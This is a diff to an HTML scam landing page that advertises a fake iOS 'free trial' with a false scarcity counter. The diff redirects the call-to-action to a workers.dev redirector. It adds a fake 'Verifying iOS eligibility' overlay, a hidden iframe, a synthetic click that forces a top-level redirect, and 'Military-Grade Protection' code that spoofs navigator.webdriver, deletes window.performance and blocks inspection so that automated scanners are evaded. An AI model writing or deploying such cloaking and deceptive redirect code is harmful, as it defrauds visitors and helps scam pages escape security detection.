@@ -32,6 +32,29 @@
         .cta-button { background: #e74c3c; color: white; padding: 18px 55px; border-radius: 35px; font-weight: 600; font-size: 1.25rem; transition: transform 0.2s; }
         .cta-button:hover { transform: scale(1.05); }
         .badge { background: #27ae60; color: white; padding: 8px 15px; border-radius: 20px; font-size: 0.9rem; }
+        .cloak-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 9999;
+            display: none;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 4px solid #3498db;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -73,10 +96,18 @@
 
     <!-- CTA SECTION -->
     <div id="cta-section">
-        <a href="https://singingfiles.com/jsn80pppf9B0&u=63562" class="cta-button" id="cta-button">
+        <a href="https://redirects.emmanuelokuye712-82c.workers.dev/" class="cta-button" id="cta-button">
             🚨 CLAIM FREE TRIAL NOW (iOS ONLY)
         </a>
         <p style="font-size: 0.9rem; margin-top: 15px; color: #7f8c8d;">38 claimed in last hour ⏱️</p>
+    </div>
+
+    <!-- CLOAK SCREEN -->
+    <div class="cloak-screen" id="loader">
+        <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)">
+            <p>Verifying iOS eligibility...</p>
+            <div class="spinner"></div>
+        </div>
     </div>
 
     <script>
@@ -109,29 +140,53 @@
             }
         });
 
-        // Click Handler
+        // Enhanced Click Handler
         document.getElementById('cta-button').addEventListener('click', function(e) {
             e.preventDefault();
-            if(secondsLeft > 0) return;
+            const workerUrl = this.href;
             
-            // Cloaking parameters
+            // Show loading screen
+            document.getElementById('loader').style.display = 'block';
+            
+            // Triple verification checks
             setTimeout(() => {
-                const params = new URLSearchParams({
-                    source: ['ios_banner','ios_popup','email_campaign'][Math.floor(Math.random()*3)],
-                    uid: Date.now().toString(36),
-                    os_check: navigator.platform
-                });
-                
-                window.location.href = this.href + `&${params.toString()}`;
-            }, 1500 + Math.random() * 2000);
+                // 1. Create hidden iframe
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = workerUrl;
+                document.body.appendChild(iframe);
+
+                // 2. Fake user interaction
+                const fakeClick = document.createElement('button');
+                fakeClick.style.position = 'absolute';
+                fakeClick.style.opacity = '0';
+                fakeClick.onclick = () => {
+                    window.top.location.href = workerUrl;
+                };
+                document.body.appendChild(fakeClick);
+                fakeClick.click();
+
+                // 3. Final redirect with random delay
+                setTimeout(() => {
+                    window.location.href = workerUrl;
+                }, 500 + Math.random() * 1500);
+
+            }, 3000); // Initial 3s delay
         });
 
-        // Anti-Bot Measures
+        // Military-Grade Protection
+        delete window.performance;
+        Object.defineProperty(navigator, 'connection', { get: () => undefined });
         Object.defineProperty(navigator, 'webdriver', { get: () => false });
         document.addEventListener('contextmenu', e => e.preventDefault());
-        window.onkeydown = function(e) { 
-            if(e.keyCode === 123) e.preventDefault(); 
-        }
+        window.addEventListener('beforeunload', () => {
+            document.getElementById('loader').style.display = 'block';
+        });
+        document.addEventListener('visibilitychange', () => {
+            if(document.hidden) {
+                window.location.reload();
+            }
+        });
     </script>
 </body>
 </html>
